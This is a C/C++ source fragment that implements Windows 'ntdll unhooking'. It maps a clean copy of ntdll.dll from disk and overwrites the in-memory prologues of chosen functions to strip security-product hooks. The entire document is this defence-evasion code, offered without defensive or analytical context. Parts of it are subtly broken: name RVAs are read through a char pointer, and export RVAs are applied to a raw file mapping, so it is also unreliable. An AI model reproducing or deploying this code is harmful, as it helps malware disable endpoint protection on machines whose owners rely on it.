static DWORD RvaToFileOffset(PBYTE base, DWORD rva) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (rva >= sec[i].VirtualAddress && rva < sec[i].VirtualAddress + sec[i].Misc.VirtualSize) {
            return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
        }
    }
    return 0;
}

static bool UnhookNtdll() {
    HANDLE hFile = CreateFileA(CLEAN_NTDDLL_PATH, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, nullptr);
    HANDLE hMap = CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    CloseHandle(hFile);
    if (!hMap) return false;

    PBYTE cleanDll = (PBYTE)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, fileSize);
    CloseHandle(hMap);
    if (!cleanDll) return false;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanDll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(cleanDll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(cleanDll + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    PBYTE ntdllBase = (PBYTE)hNtdll;
    DWORD* funcAddrs = (DWORD*)(cleanDll + exports->AddressOfFunctions);
    WORD* funcOrdinals = (WORD*)(cleanDll + exports->AddressOfNameOrdinals);
    char* funcNames = (char*)(cleanDll + exports->AddressOfNames);

    for (int i = 0; TARGET_FUNCTIONS[i] != nullptr; i++) {
        for (DWORD j = 0; j < exports->NumberOfNames; j++) {
            const char* exportName = (const char*)(cleanDll + funcNames[j]);
            if (strcmp(exportName, TARGET_FUNCTIONS[i]) == 0) {
                WORD ordinal = funcOrdinals[j];
                DWORD funcRva = funcAddrs[ordinal];
                if (funcRva == 0) continue;

                DWORD fileOffset = RvaToFileOffset(cleanDll, funcRva);
                if (fileOffset == 0) continue;

                BYTE cleanBytes[UNHOOK_COPY_SIZE] = {0};
                RtlCopyMemory(cleanBytes, cleanDll + fileOffset, UNHOOK_COPY_SIZE);

                PBYTE targetAddr = ntdllBase + funcRva;
                DWORD oldProtect = 0;
                if (VirtualProtect(targetAddr, UNHOOK_COPY_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                    RtlCopyMemory(targetAddr, cleanBytes, UNHOOK_COPY_SIZE);
                    VirtualProtect(targetAddr, UNHOOK_COPY_SIZE, oldProtect, &oldProtect);
                }
                break;
            }
        }
    }

    UnmapViewOfFile(cleanDll);
    return true;
}

